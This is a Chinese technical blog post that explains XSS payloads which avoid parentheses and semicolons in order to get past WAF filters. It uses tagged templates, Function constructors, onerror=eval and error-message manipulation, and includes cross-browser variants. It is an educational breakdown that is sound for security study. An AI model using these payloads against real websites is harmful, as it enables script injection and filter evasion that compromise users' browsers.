---
来源: https://blog.huli.tw/2025/09/15/xss-without-semicolon-and-parentheses/
类型: html
获取日期: 2026-06-29
---

不需要括號跟分號的 XSS - Huli's blog


window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-1393J2EVCZ');


if (localStorage.getItem('dark-mode')) {
if (localStorage.getItem('dark-mode') === 'true') {
document.body.classList.add('dark-mode')
}
} else {
if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
document.body.classList.add('dark-mode')
}
}


[Huli's blog](/)

[文章列表](/archives)
[隨意聊](/notes)
[分類](/categories)
[關於我](/about)

目錄

[1  **為什麼我們需要這種 payload？**](#為什麼我們需要這種-payload)


---

[2  **先從不需要括號開始**](#先從不需要括號開始)
[2.1  Tagged template strings](#tagged-template-strings)
[2.2  onerror 事件](#onerror-事件)


---

[3  **再省去分號**](#再省去分號)


---

[4  **其他 payload**](#其他-payload)


---

[5  **總結**](#總結)


[English](/2025/09/15/en/xss-without-semicolon-and-parentheses/)

如果有什麼想回饋的（如對文章或部落格的感想），除了留言以外也能填表單跟我說：[表單連結](https://forms.gle/XuWyRC5qtSd2ANta8)。

# 不需要括號跟分號的 XSS

2025年9月15日


[JavaScript](/categories/JavaScript/)

前陣子收到一封讀者來信，問我能不能寫一篇來講解 [XSS without parentheses and semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons) 這篇文章，說是這裡面的 payload 看不太懂。

因此，這篇就來簡單講解一下這些 payload，參考的原文是 Gareth Heyes 的這兩篇文章：

1. [XSS technique without parentheses](https://thespanner.co.uk/2012/05/01/xss-technique-without-parentheses)
2. [XSS without parentheses and semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)

## 為什麼我們需要這種 payload？

有些人會想說既然都可以執行 JavaScript 了，幹嘛還要這麼多限制？而最大的原因是：WAF（Web Application Firewall），最常見的就是 Cloudflare 的 WAF，只要有一點風吹草動就把你擋下來，儘管你可以插入 HTML 或甚至執行 JavaScript，但只要含有某些 pattern 就直接把你擋掉。

再者，有些情境會造成部分字元不可用，這時候就需要發揮創意，想辦法不用這些字元來湊出可以執行的程式碼。

## 先從不需要括號開始

在 JavaScript 中似乎要執行函式就一定要括號，那如果不能用括號該怎麼辦呢？

### Tagged template strings

第一種方法有些開發者應該用過，但可能一時不會想到。某些 JavaScript 的 library 會用 template strings 來執行函式，如 [Postgres.js](https://github.com/porsager/postgres?tab=readme-ov-file#usage)：

```
async function getUsersOver(age) {
  const users = await sql`
    select
      name,
      age
    from users
    where age > ${ age }
  `
  // users = Result [{ name: "Walter", age: 80 }, { name: 'Murray', age: 68 }, ...]
  return users
}
```

不懂的人乍看之下會想說怎麼這樣寫，難道不是個 SQL injection 漏洞嗎？

如果只用了 template strings 的話，那確實是，但注意前面多了個 `sql`，這就不一樣了，就不只是單純的字串拼接，而是函式執行了，是一個 JavaScript 的語法，可以看底下範例：

```
function test(...args){
    console.log(args)
}

test`Hello ${'huli'}!!!${'good'}~~`
// [['Hello ', '!!!', '~~'], 'huli', 'good']
```

當我們在前面加上一個函式時，函式的參數會收到原始字串中固定的部分，以及被插入的變數，就可以直接用這些資訊做 sanitization，來避免 SQL injection，這種用法叫做 tagged templates strings。

最後達成的效果就是看起來只是字串取代，但背後是函式執行而且有做 sanitization，所以其實是安全的。

利用這個概念，就可以寫出不需要括號的 XSS payload：

```
alert`test`
```

但有些人會問說，這樣的話就只能執行 alert 而已，有沒有辦法執行任意程式碼呢？例如說 fetch 好了，我如果想要 POST 的話，一定要用到第二個參數：`fetch(url, { method:'POST'})`，而上面的方法第二個參數會是個陣列，因此 fetch 會報錯，就跑不動了。

針對這個問題，我們可以先利用 function constructor，傳入字串來建立一個函式，不熟這個的之後可以去讀：[如何不用英文字母與數字寫出 console.log(1)？](https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/)或是[Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼](https://blog.huli.tw/2021/06/07/xss-challenge-by-intigriti-writeup-may/)，但我還是先簡單介紹一下。

在 JavaScript 中，可以用 `new Function(code)` 來動態建立出一個函式：

```
new Function('alert(1)')
// anonymous() { alert(1) }
```

而那個 new 其實不是必須的，拿掉也無妨。再者，動態建立的函式是可以傳參數的：

```
new Function('a', 'alert(a+1)')
// anonymous(a) { alert(a+1) }

new Function('a', 'b', 'alert(a+b)')
// anonymous(a,b) { alert(a+b) }
```

最後一個參數會被當作實際的程式碼，前面的都會被當成是函式的參數，並且回傳建立好的函式。

因此，我們可以利用這點搭配剛剛講的 tagged templates，從字串建立函式：

```
Function`alert(1)`
// anonymous() { alert(1) }
```

那這個建立出來的函式，要怎麼執行呢？很簡單，再用一次相同作法就好：

```
// 最後多加兩個 ``，就跟前面講過的 alert`1` 用法一樣
// 怕 markdown parser 出錯，多加一個空格，但有沒有都一樣
Function`alert(1)` ``
```

因為裡面的 `alert(1)` 是字串，所以括號可以直接用 unicode 來取代，這也是合法的字串表示方法，會變成：

```
// 其實就是 alert(1) 啦
Function`alert\u00281\u0029` ``
```

這樣整個 payload 就沒有用到任何括號，但又能執行任意程式碼了！

這個做法用到的是執行 template 時的第一個參數，也就是固定的部分，但我們也可以用到後面的參數。舉例來說：

```
function test(a, b){
    console.log(a) // ['_', '']
    console.log(b) // hello
}

test`_${'hello'}`
```

當我們同時傳入固定字串與參數時，第一個參數是所有固定的部分，這個剛提過了，而第二個參數則是我們動態傳入的變數 `hello`。

用上面的方法建立函式時，如同剛講過的，最後的參數會被當作 function body：

```
Function`_${'hello'}`
// anonymous(_,) { hello }
```

因此這個 `hello` 就是我們可以控制的部分了。因為它是動態傳入的，所以能玩的方法就很多了，可以搭配網站上我們能控制的地方。舉例來說，`location.hash` 會回傳 URL 上的 hash 如 `#test`，只要加上 slice(1) 就可以把前面的 # 去掉，結合起來就是：

```
// 從剛剛講到的這個開始
Function`_${'hello'}`

// 先換成 location.hash.slice(1)
Function`_${location.hash.slice(1)}`

// 把 slice(1) 換成 ``
Function`_${location.hash.slice`1`}`

// 最後再加上 `` 執行函式
// 記得把網站的 hash 弄成 #alert(1)
Function`_${location.hash.slice`1`}` ``
```

就組出了一個不用括號但卻能執行任意程式碼的 payload，把實際要執行的字串放在 hash，動態去執行 hash 中的程式碼。

### onerror 事件

前面寫這麼多其實還沒進入正題，開頭提的原文發現的是另外一種更巧妙的方法。

在瀏覽器環境中，利用 `window.onerror`，可以接收到所有沒有被 catch 的錯誤事件：

```
onerror = (err) => console.log('Err:' + err.toString())
throw 'hello';
// Err:Uncaught hello
```

話說上面這段程式碼直接在 DevTools 執行會不起作用（原因在原文有講到，在 console 直接執行時錯誤不會被丟到 onerror），請開一個 HTML 來測。

總之呢，上面的程式碼告訴我們在 Chrome 上，被捕捉到的錯誤訊息會是 `Uncaught hello`。

那如果我們直接把 `onerror` 換成 `alert` 呢？

```
onerror = alert;
throw 'hello';
```

你就會直接看到一個 `Uncaught hello` 的 popup。上面的 payload 是沒有用到任何括號的，也達成了執行函式的目的。

再進一步延伸，就是把 `onerror` 換成 `eval`，把錯誤訊息當成 JavaScript 程式碼來執行，但問題是換成 eval 之後，要怎麼湊出合法的程式碼？

由於被捕捉到的錯誤訊息會是：`Uncaught {payload}`，這整句會被當成是程式碼來執行，因此只要把 payload 換成：`=alert(1)`，整句就是：`Uncaught=alert(1)`，把錯誤訊息中的 `Uncaught` 當成是變數來用了，如此一來就是合法的程式碼：

```
onerror = eval;
throw '=alert(1)';
```

如果還是不知道原理的話，把 eval 換成 console.log 就很清楚了：

```
onerror = console.log;
throw '=alert(1)';
// Uncaught =alert(1)
```

再來，由於 throw 後面接的是字串，所以可以跟前面一樣用 encoding 來代替，用 `\x28` 或是 `\u0028` 都行：

```
onerror = eval;
throw '=alert\x281\u0029';
```

就湊出了一個不需要括號的 payload。

## 再省去分號

Tagged template strings 已經不需要分號了，因此我們繼續沿著 onerror 這條路走，看看怎麼把分號省掉。

一個簡單直覺的想法是用逗號就好（為了方便舉例，底下都用 alert 了）：

```
onerror=alert,throw 1;
```

但跑了以後會發現報錯：`Uncaught SyntaxError: Unexpected token 'throw'`，這是因為 throw 不是個 expression 而是 statement，因此不能放在逗號後面，我們需要別的方法。

在 JavaScript 中就算你沒有用 if 或其他需要區塊的程式碼，也可以自己用區塊把程式碼包起來：

```
{
  let a = 1;
  console.log(a)
}
```

這在開發上是確實會用到的（儘管不多），用途就是刻意建立區塊並且搭配 `let` 或是 `const` 的關鍵字，讓變數只活在這個區塊裡。

只要利用區塊，就可以達成不用分號也能分隔程式碼的目的了：

```
{onerror=alert}throw 1
```

除了利用區塊以外，還有其他更酷炫的方法。

先來講一下 JavaScript 中逗號的用法，基本上就是串聯幾個 expression 並回傳最後一個的結果，如：

```
if (console.log(1), alert(1), true) {
    console.log(true)
} else {
    console.log(false)
}
// 1
// true
```

`if` 中的表達式會依序執行 `console.log(1)`、`alert(1)` 最後回傳 true，因此 `if` 的結果成立，印出 true。

而 `throw` 後面可以接一個表達式，因此你可以：

```
throw onerror=alert,1
```

就會先執行 `onerror=alert`，再執行 `throw 1`，跟我們用 `{}` 的做法達成的效果是一樣的，這就是另外一種不需要分號的方法。

Chrome 的地方就到這裡結束了，接下來都是為了 Firefox 所做的努力。

在 Firefox 中有錯誤時，它錯誤訊息的格式不一樣：

```
onerror=alert;
throw 1;
// uncaught exception: 1
```

在這個錯誤訊息之下，組不出來合法的程式碼，之前提的把 `onerror` 換成 `eval` 就沒用了。

於是 Gareth Heyes 就繼續深挖，發現了兩件事情。第一件事情是，如果 throw 一個 Error 而不是字串，錯誤訊息就不會有這些惱人的 prefix，只剩一個 `Error:`：

```
onerror=alert;
throw new Error(1);
// Error: 1
```

由於 `Label:` 在 JavaScript 是個合法的程式碼，所以後面直接放程式碼就好，輕輕鬆鬆：

```
onerror=eval;
throw new Error('alert(1)');
```

但用了 `Error()` 的話就有括號了，而 Gareth Heyes 的第二個發現是，在 Firefox 上你可以 throw 一個 error-like object，也能達到相同效果：

```
onerror=eval;
throw {lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'};
```

總而言之呢，這些都是為了要控制 Firefox 最後產生的錯誤訊息，只要能控制，就能組成合法程式碼丟到 eval 去執行。

剛好最近看到 Gareth Heyes [發推](https://x.com/garethheyes/status/1961078705293246513)，說 Firefox 要把這個功能修掉了：[Firefox removed support for throwing error-like objects](https://github.com/PortSwigger/xss-cheatsheet-data/issues/103)，於是他就找出了一個新的方法：

```
throw onerror=eval,x=new Error,x.message='alert\x281\x29',x
```

看起來是要 new Error 的話，不需要括號也可以。有了一個 Error 物件之後再設定 message，就一樣能控制錯誤訊息。

## 其他 payload

原文底下有其他人提了另外兩個 payload。

第一個來自 [@terjanq](https://x.com/terjanq/status/1128692453047975936)：

```
throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337,3331,117]+a[13]
```

這個 payload 我試了一下目前只能在 Chrome 執行，很明顯可以拆成幾個部分：

1. `/a/`
2. `Uncaught=1`
3. `g=alert`
4. `a=URL+0`
5. `onerror=eval`
6. `throw /1/g+a[12]+[1337,3331,117]+a[13]`

因為是用逗號接起來的，所以 throw 的會是最後的那一段。

先從最後一段開始好了，這個 `throw /1/g+a[12]+[1337,3331,117]+a[13]` 是幹嘛的。

首先呢，a 是 `URL+0`，而 URL 是個 global 的函式，函式 + 0 會變字串，所以 a 是 `"function URL() { [native code] }0"`，因此 `a[12]` 跟 `a[13]` 分別就是 `(` 跟 `)` 了。

而 `/1/g` 是個 regexp，變成字串的時候會是 `"/1/g"`。至於 `[1337,3331,117]` 這個陣列，變字串時會呼叫 join，結果就是 `"1337,3331,117"`。

結合在一起，`/1/g+a[12]+[1337,3331,117]+a[13]` 就會是 `/1/g(1337,3331,117)`。

再搭配前面講過的，throw 什麼錯誤訊息就會是什麼，產生的錯誤訊息為：

```
Uncaught /1/g(1337,3331,117)
```

這邊的 `/` 雖然之前是當作 regexp，可是在現在的程式碼中，其實是算數的除法，也就是 `a / b / c`，其中 a 是 `Uncaught`，b 是 `1`，c 是 `g(1337,3331,117)`。

而 `Uncaught` 如果沒宣告就會出錯，所以才需要 `Uncaught=1`，接著 g 會被當成函式執行，因此 `g=alert`。

那最前面的 `/a/` 呢？這個應該只是不想讓 `throw` 跟後面的 payload 有空格所以才加的，實際上沒其他作用。

這個解法的精華在於 throw 的時候讓錯誤訊息變成 `Uncaught /1/g(1337,3331,117)`，是一段合法的程式碼，只要把一些前提補齊，就可以成功呼叫 `g` 這個函式。

第二個來自 [@cgvwzq](https://x.com/cgvwzq)：

```
TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']
```

這邊其實分成兩句，第一句是：`TypeError.prototype.name ='=/'`，這句是把 TypeError 的名稱強制修改成 `=/`。

如果沒有這一句的話，`0[0]['test']` 的錯誤訊息是：`Uncaught TypeError: Cannot read properties of undefined (reading 'test')`

`0[0]` 會是 undefined，而 `undefined['test']` 就會拋出這個 TypeError。

當我們強制把 name 改掉以後：

```
TypeError.prototype.name ='hello!';
0[0]['test'];
// Uncaught hello!: Cannot read properties of undefined (reading 'test')
```

就可以控制原本 `TypeError` 的部分，變成任意字串。

而另外一句 `0[onerror=eval]['/-alert(1)//']`，`0[onerror=eval]` 其實就只是把賦值放在 `[]` 裡面，賦值以後等同於 `0[eval]`，這個會回傳 undefined，於是就會拋一個 TypeError 出來。

換個方式看好了，底下程式碼：

```
TypeError.prototype.name ='{1}';
0[eval]['{2}'];
```

在 Chrome 上會產生的錯誤訊息為：

```
Uncaught {1}: can't access property "{2}", 0[eval] is undefined
```

現在的問題就變成，該怎麼透過控制上面的字串，讓錯誤訊息變成合法的程式碼？

在 `{1}` 的地方作者放了 `=/`，合起來就是 `Uncaught=/`，這個 `/` 其實是 regexp 的意思，因此這個方法的思路為，讓 `{2}` 前面那一堆字串（`: can't access property "`）都變成 regexp 的一部分。

因此 `{2}` 的地方開頭為 `/`，把前面湊成一個 regexp，接著用 `-alert(1)` 去執行函式，這邊改成 `+alert(1)` 也行，就只是要把兩個操作串起來而已。執行完以後，後面的程式碼全都用 `//` 註解掉，就可以不用管了。

但如果你實際去跑上面這段 payload，會發現 Chrome 回傳錯誤訊息：`Invalid regular expression ... Unterminated group`，這是因為錯誤訊息裡面有個 `(`，那時可能還沒有，造成 regexp 語法有誤，只需要加個 `)` 就行了：

```
TypeError.prototype.name ='=/',0[onerror=eval][')/-alert(1)//']
```

產生的錯誤訊息就會是：

```
Uncaught =/: Cannot read properties of undefined (reading ')/-alert(1)//')
```

稍微簡化一下就是：

```
Uncaught =/regexp/-alert(1)//...
```

話說這個 payload 在 Chrome 139 上沒問題，Firefox 142 則會報錯：`Uncaught SyntaxError: expected expression, got '='`。

想要 debug 的話，把 `onerror=eval` 改成 `onerror=console.log` 就好，先看一下產生的錯誤訊息長怎樣：

```
=/: can't access property ")//alert(1)//", 0[console.log] is undefined
```

看來 Firefox 上，TypeError 的 name 前面沒有任何東西，因此要讓 Firefox 可以動的話，前面隨便加個可以當變數的字元就行：

```
TypeError.prototype.name ='a=/',0[onerror=eval]['/-alert(1)//']
```

若是真的有理解這個做法，只要延續這個思路，其實在 TypeName 那邊就可以插入程式碼了，結果是一樣的，但帥氣度沒這麼高（在 Chrome 上沒問題）：

```
TypeError.prototype.name ='=alert(1)//',0[onerror=eval][2]
```

至於要怎麼組出一個 Chrome 跟 Firefox 都可以的 payload，讀者可以自行練習，或是參考我組出來的一個範例，多加了一些變形：

```
TypeError.prototype.name ='+/[',[onerror=eval][window.Uncaught++][']/-alert\501\51<!--']
```

## 總結

其實不管是哪個 payload，核心概念都是相同的，只要把錯誤訊息變成合法的 JavaScript 程式碼，再丟給 eval 執行即可。

要看懂 payload，無非就是要對 JavaScript 程式碼比較熟悉，例如說 `0[onerror=eval]` 或是逗號的用法，至少要知道在幹嘛。

除此之外，就是發揮想像力了，這個就比較難練習，通常都會從觀察模仿開始。

最後整理幾個關鍵點：

1. 逗號可以串連多個 expression，會回傳最後一個
2. 把 onerror 換成 eval，就能把錯誤訊息當程式碼執行
3. throw 出去的錯誤會變成錯誤訊息的一部分
4. 只要能讓錯誤訊息變成合法程式碼就大功告成

[#JavaScript](/tags/JavaScript/)

[Chrome 內建的翻譯與 Prompt API](/2025/09/27/chrome-built-in-prompt-api/)

[人人都需要一個 HTTP proxy 來 debug](/2025/04/23/everyone-need-a-http-proxy-to-debug/)

### 評論

© 2026 Huli 
Powered by [Hexo](http://hexo.io/) & [Minos](https://github.com/ppoffice/hexo-theme-minos)

[GitHub](https://github.com/ppoffice/hexo-theme-minos "GitHub")

繁體中文

[English](/2025/09/15/en/xss-without-semicolon-and-parentheses/)


(function ($) {
$(document).ready(function () {
if (typeof($.fn.lightGallery) === 'function') {
$('.article.gallery').lightGallery({ selector: '.gallery-item' });
}
});
})(jQuery);


.hljs {
position: relative;
}
.hljs .clipboard-btn {
float: right;
color: #9a9a9a;
background: none;
border: none;
cursor: pointer;
}
.hljs .clipboard-btn:hover {
color: #8a8a8a;
}
.hljs > .clipboard-btn {
display: none;
position: absolute;
right: 4px;
top: 4px;
}
.hljs:hover > .clipboard-btn {
display: inline;
}
.hljs > figcaption > .clipboard-btn {
margin-right: 4px;
}

$(document).ready(function () {
$('figure.hljs').each(function(i, figure) {
var codeId = 'code-' + i;
var code = figure.querySelector('.code');
var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
code.id = codeId;
copyButton.addClass('clipboard-btn');
copyButton.attr('data-clipboard-target-id', codeId);
var figcaption = figure.querySelector('figcaption');
if (figcaption) {
figcaption.append(copyButton[0]);
} else {
figure.prepend(copyButton[0]);
}
})
var clipboard = new ClipboardJS('.clipboard-btn', {
target: function(trigger) {
return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
}
});
clipboard.on('success', function(e) {
e.clearSelection();
})
})